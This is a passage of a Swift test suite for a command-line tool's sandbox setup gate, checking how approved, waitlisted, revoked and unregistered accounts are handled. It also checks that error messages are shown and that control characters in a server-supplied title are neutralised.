        #expect(decodedText(result.standardOutputContent).hasPrefix("Darkbloom revoked your account's access to Clusters.\n"))
    }

    // MARK: - The sandbox setup gate

    @Test("an approved account goes on to check this Mac")
    func gateAdmitsApproved() async throws {
        let result = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: false, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           probe: { _ in .mac(cores: 16, memoryGiB: 128) }, waitlist: .approved).run()
            }
        }
        // Without --yes or a terminal the flow stops at its own confirmation.
        #expect(decodedText(result.standardOutputContent).hasPrefix("Darkbloom Sandbox setup\n\nChecking this Mac\n"))
    }

    @Test("a coordinator without the sandbox waitlist (404) lets a setup go on")
    func gateAdmitsWithoutWaitlists() async throws {
        let result = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            let sandbox = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                defer { print("requests \(waitlistRequests())") }
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: false, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           probe: { _ in .mac(cores: 16, memoryGiB: 128) },
                                           waitlist: .live(configPath: sandbox.config.path)).run()
            }
        }
        let output = decodedText(result.standardOutputContent)
        #expect(output.hasPrefix("Darkbloom Sandbox setup\n\nChecking this Mac\n"))
        // The gate asks for its own waitlist, not for the list.
        #expect(output.hasSuffix("requests GET /v1/waitlists/sandbox\n"))
    }

    @Test("a waitlisted or revoked account stops before this Mac is checked or anything is downloaded")
    func gateRefuses() async throws {
        let waitlisted = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                defer { print("requests \(CoordinatorStub.requests.count)") }
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           probe: { _ in .mac(cores: 16, memoryGiB: 128) },
                                           waitlist: .answering(FeatureWaitlistTests.sandbox(.waitlisted, position: 2))).run()
            }
        }
        let output = decodedText(waitlisted.standardOutputContent)
        #expect(output.hasPrefix("You're on the Darkbloom Sandbox waitlist: #2 in line.\n"))
        #expect(output.contains("  Check again: \(Sandbox.cli) waitlist sandbox\n"))
        #expect(output.contains("  Nothing was installed. Run `\(Sandbox.cli) sandbox setup` again once Darkbloom approves your account.\n"))
        #expect(!output.contains("Checking this Mac"))
        #expect(output.hasSuffix("requests 0\n"))
        let revoked = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(FeatureWaitlistTests.sandbox(.revoked))).run()
            }
        }
        #expect(decodedText(revoked.standardOutputContent).hasPrefix("Darkbloom revoked your account's access to Darkbloom Sandbox.\n"))
    }

    @Test("an account not on the waitlist joins it with --yes, naming the Macs it asks for, or is told how without a terminal")
    func gateJoins() async throws {
        let joined = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(FeatureWaitlistTests.sandbox(.none),
                                                                joined: FeatureWaitlistTests.sandbox(.waitlisted, position: 7))).run()
            }
        }
        let output = decodedText(joined.standardOutputContent)
        #expect(output.hasPrefix("Darkbloom Sandbox is open to the accounts Darkbloom approves from its waitlist.\njoined sandbox 1\n"
            + "You're on the Darkbloom Sandbox waitlist: #7 in line.\n"))
        #expect(!output.contains("Checking this Mac"))
        // The coordinator's title names the waitlist, and a waitlist without
        // a Mac range is joined without this Mac.
        let renamed = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(.success(FeatureWaitlistTests.place("sandbox", "Sandbox CI")),
                                                                joined: .success(FeatureWaitlistTests.place("sandbox", "Sandbox CI",
                                                                                                            .waitlisted)))).run()
            }
        }
        #expect(decodedText(renamed.standardOutputContent).hasPrefix(
            "Sandbox CI is open to the accounts Darkbloom approves from its waitlist.\njoined sandbox none\n"
            + "You're on the Sandbox CI waitlist.\n"))
        let unattended = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: false, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(FeatureWaitlistTests.sandbox(.none))).run()
            }
        }
        #expect(decodedText(unattended.standardOutputContent) == "Darkbloom Sandbox is open to the accounts Darkbloom approves "
            + "from its waitlist.\n  Join it: \(Sandbox.cli) waitlist sandbox join\n")
        let approvedOnJoin = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            try replaceStandardInput(with: "y\n")
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: false, addon: .live(), interactiveInput: true,
                                           terminal: false, color: false,
                                           probe: { _ in .mac(cores: 8, memoryGiB: 16) },
                                           waitlist: .answering(FeatureWaitlistTests.sandbox(.none),
                                                                joined: FeatureWaitlistTests.sandbox(.approved))).run()
            }
        }
        // An account an admin already approved goes straight on to the checks.
        #expect(decodedText(approvedOnJoin.standardOutputContent).contains(
            "Join the Darkbloom Sandbox waitlist now? [y/N]: joined sandbox 1\nDarkbloom Sandbox setup\n\nChecking this Mac\n"))
    }

    @Test("without a login or an answer the gate says why, naming Darkbloom Sandbox")
    func gateNeedsAnswer() async throws {
        let login = try await #require(processExitsWith: .failure, observing: [\.standardErrorContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false, waitlist: .answering(.failure(.needsLogin))).run()
            }
        }
        #expect(decodedText(login.standardErrorContent).contains("Link this Mac to your Darkbloom account first: \(Sandbox.cli) login"))
        let unreachable = try await #require(processExitsWith: .failure, observing: [\.standardErrorContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(.failure(.unavailable("HTTP 500: boom")))).run()
            }
        }
        #expect(decodedText(unreachable.standardErrorContent)
            == "Could not reach the Darkbloom Sandbox waitlist at \(CLICommandSandbox.coordinatorURL): HTTP 500: boom\n")
    }

    @Test("the gate prints the coordinator's title without control characters, and names it when the join fails")
    func gatePrintsTitleSafely() async throws {
        let result = try await #require(processExitsWith: .failure, observing: [\.standardOutputContent, \.standardErrorContent]) {
            _ = try CLICommandSandbox.enter(autoRestart: false)
            await exitWithCommandStatus {
                try await SandboxSetupFlow(options: SandboxSetupOptions(server: "https://sandbox.invalid"),
                                           confirmed: true, addon: .live(), interactiveInput: false,
                                           terminal: false, color: false,
                                           waitlist: .answering(.success(FeatureWaitlistTests.place("sandbox", "Sandbox\u{1B}[2J CI")),
                                                                joined: .failure(.unavailable("HTTP 500: boom")))).run()
            }
        }
        #expect(decodedText(result.standardOutputContent)
            == "Sandbox\u{FFFD}[2J CI is open to the accounts Darkbloom approves from its waitlist.\njoined sandbox none\n")
        #expect(decodedText(result.standardErrorContent)
            == "Could not reach the Sandbox\u{FFFD}[2J CI waitlist at \(CLICommandSandbox.coordinatorURL): HTTP 500: boom\n")
    }
}
